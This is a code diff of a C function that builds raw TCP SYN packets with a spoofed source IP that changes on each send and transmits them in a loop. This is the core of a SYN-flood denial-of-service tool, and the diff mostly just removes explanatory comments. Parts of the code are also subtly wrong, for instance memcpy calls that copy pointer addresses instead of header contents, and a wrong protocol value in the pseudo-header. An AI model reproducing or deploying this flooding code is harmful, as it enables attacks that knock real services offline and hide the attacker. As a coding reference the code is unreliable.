@@ -63,12 +63,12 @@ static ushort chksum(ushort *data,ushort length)
 void sendsynfunc(int FakeIpHost,int sockfd,struct sockaddr_in *addr)
 {
     int SendSEQ;
-    int count;//统计发送循环次数
-    char buf[40];//校验和计算
+    int count;
+    char buf[40];
     char sendBuf[100];
     struct ip *ip;
     struct tcphdr *tcp;
-    struct prehdr//tcp伪首部
+    struct prehdr
     {
         struct sockaddr_in sourceaddr;//source address
         struct sockaddr_in destaddr;//dst daaress
@@ -77,7 +77,6 @@ void sendsynfunc(int FakeIpHost,int sockfd,struct sockaddr_in *addr)
         ushort length;
     }prehdr;
    int len = sizeof(struct ip)+sizeof(struct tcphdr);
-    //开始填充ip与tcp首部
    bzero(buf,sizeof(buf));
    bzero(sendBuf,sizeof(sendBuf));
    ip = (struct ip *)sendBuf;//指向发送缓冲区的头部
@@ -107,27 +106,21 @@ void sendsynfunc(int FakeIpHost,int sockfd,struct sockaddr_in *addr)
        if(SendSEQ++ == 65535){
             SendSEQ = 1;
        }
-       //更新ip首部
-       ip->ip_src.s_addr = htonl(FakeIpHost+SendSEQ);//每次随机产生源ip地址
+       ip->ip_src.s_addr = htonl(FakeIpHost+SendSEQ);
        ip->ip_sum = 0;
-       //更新tcp首部
        tcp->seq = htonl(0x12345678+SendSEQ);
        tcp->check = 0;
-       // ip->ip_src.s_addr = myrandom(0,65535);
        printf("source addr is :%s\n",inet_ntoa(ip->ip_src));
        printf("dest addr is :%s\n",inet_ntoa(addr->sin_addr));
        printf("\n============================\n");
-       //tcp伪首部数据填充
        prehdr.sourceaddr.sin_addr = ip->ip_src;
        prehdr.destaddr.sin_addr = addr->sin_addr;
        prehdr.zero = 0;
        prehdr.protocol = 4;
        prehdr.length = sizeof(struct tcphdr);
-       //封装tcp首部与伪首部至buf;
        memcpy(buf,&prehdr,sizeof( prehdr));
        memcpy(buf+sizeof( prehdr),&tcp,sizeof(struct tcphdr));
-       tcp->check = chksum((u_short *)&buf,12+sizeof(struct tcphdr));//校验和计算
-       //封装ip和tcp首部数据包至sendBuf
+       tcp->check = chksum((u_short *)&buf,12+sizeof(struct tcphdr));
        memcpy(sendBuf,&ip,sizeof(ip));
        memcpy(sendBuf+sizeof(ip),&tcp,sizeof(tcp));
        sendto(sockfd,sendBuf,len,0,(struct sockaddr *)&addr,sizeof(struct sockaddr));
